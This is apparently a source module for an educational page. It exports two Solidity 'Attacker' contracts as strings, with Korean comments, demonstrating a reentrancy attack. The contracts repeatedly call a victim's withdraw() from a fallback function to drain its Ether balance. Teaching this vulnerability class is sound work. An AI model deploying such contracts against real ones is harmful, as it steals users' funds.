export const Research0602ReentranceExample = `
// Attacker contract
contract Attacker {
    address public vulnerable;

    constructor(address _vulnerable) {
        vulnerable = _vulnerable;
    }

    // fallback function (executed when receiving Ether)
    fallback() external payable {
        // malicious reentry
        if (address(vulnerable).balance > 0) {
            Vulnerable(vulnerable).withdraw();
        }
    }

    function attack() public payable {
        Vulnerable(vulnerable).deposit{value: msg.value}();
        Vulnerable(vulnerable).withdraw();
    }
}
`

export const R0602AttackerSol = `
contract Attacker {
    Bank public bank;

    constructor(address target) public payable {
        bank = Bank(target);
    }

    function deposit() public payable {
        // deposit() 실행 시 Bank 컨트랙트에 1 ether 입금 (statistics)
        bank.statistics{value: msg.value}(); 
        // 바로 출금 (withdraw(1 ether))
        bank.withdraw(1 ether); // * 최초 출금 요청
    }

    // Bank 컨트랙트가 이더를 송금할 때 Attacker의 fallback() 함수 실행됨 
    // fallback 함수 안에서 다시 bank.withdraw(1 ether) -> 재진입
    // 이 반복이 Bank 의 잔고가 1 ether 이하가 될 때까지 계속됨 -> 탈취 
    fallback() external payable {
        if (address(bank).balance > 1 ether) {
            bank.withdraw(1 ether); // * 재진입 공격 시도
        }
    }
}
` 